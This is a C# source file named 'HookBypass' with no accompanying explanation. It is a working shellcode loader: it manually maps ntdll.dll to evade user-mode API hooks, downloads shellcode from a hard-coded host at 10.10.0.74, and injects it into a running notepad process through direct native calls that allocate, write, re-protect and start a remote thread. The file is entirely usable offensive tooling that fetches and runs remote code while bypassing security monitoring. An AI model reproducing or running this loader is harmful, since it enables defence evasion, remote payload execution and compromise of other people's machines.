using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;

using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

using Data = DInvoke.Data;

namespace HookBypass
{
    internal class Program
    {
        static Data.PE.PE_MANUAL_MAP _ntdllMap;

        static async Task Main(string[] args)
        {
            _ntdllMap = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            byte[] shellcode;

            using (var client = new HttpClient())
                shellcode = await client.GetByteArrayAsync("http://10.10.0.74/shellcode.bin");

            var target = Process.GetProcessesByName("notepad")[0];
            Console.WriteLine("Target PID: {0}", target.Id);

            var hProcess = OpenProcess(target.Id);
            Console.WriteLine("Target Handle: 0x{0:X}", hProcess.ToInt64());

            var baseAddress = AllocateMemory(hProcess, shellcode.Length);
            Console.WriteLine("Base Address: 0x{0:X}", baseAddress.ToInt64());

            WriteMemory(hProcess, baseAddress, shellcode);
            ProtectMemory(hProcess, baseAddress, shellcode.Length, Data.Win32.WinNT.PAGE_EXECUTE_READ);
            CreateThread(hProcess, baseAddress);

            Map.FreeModule(_ntdllMap);
        }

        static IntPtr OpenProcess(int pid)
        {
            var oa = new Data.Native.OBJECT_ATTRIBUTES();
            var cid = new Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)pid
            };

            var hProcess = IntPtr.Zero;
            var parameters = new object[]
            {
                hProcess, Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, oa, cid
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtOpenProcess",
                typeof(Native.DELEGATES.NtOpenProcess),
                parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
                hProcess = (IntPtr)parameters[0];

            return hProcess;
        }

        static IntPtr AllocateMemory(IntPtr hProcess, int size)
        {
            var baseAddress = IntPtr.Zero;
            var regionSize = new IntPtr(size);

            var allocation = Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE;

            var parameters = new object[]
            {
                hProcess, baseAddress, IntPtr.Zero, regionSize,
                allocation, Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(Native.DELEGATES.NtAllocateVirtualMemory),
                parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
                baseAddress = (IntPtr)parameters[1];

            return baseAddress;
        }

        static bool WriteMemory(IntPtr hProcess, IntPtr baseAddress, byte[] shellcode)
        {
            var buf = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buf, shellcode.Length);

            uint bytesWritten = 0;

            var parameters = new object[]
            {
                hProcess, baseAddress, buf, (uint)shellcode.Length, bytesWritten
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(Native.DELEGATES.NtWriteVirtualMemory),
                parameters,
                false);

            Marshal.FreeHGlobal(buf);

            return status == Data.Native.NTSTATUS.Success;
        }

        static bool ProtectMemory(IntPtr hProcess, IntPtr baseAddress, int size, uint newProtect)
        {
            var regionSize = new IntPtr(size);
            var oldProtect = 0;

            var parameters = new object[]
            {
                hProcess, baseAddress, regionSize,
                newProtect, (uint)oldProtect
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(Native.DELEGATES.NtProtectVirtualMemory),
                parameters,
                false);

            return status == Data.Native.NTSTATUS.Success;
        }

        static IntPtr CreateThread(IntPtr hProcess, IntPtr baseAddress)
        {
            var hThread = IntPtr.Zero;
            var parameters = new object[]
            {
                hThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, hProcess,
                baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtCreateThreadEx",
                typeof(Native.DELEGATES.NtCreateThreadEx),
                parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
                hThread = (IntPtr)parameters[0];

            return hThread;
        }
    }
}
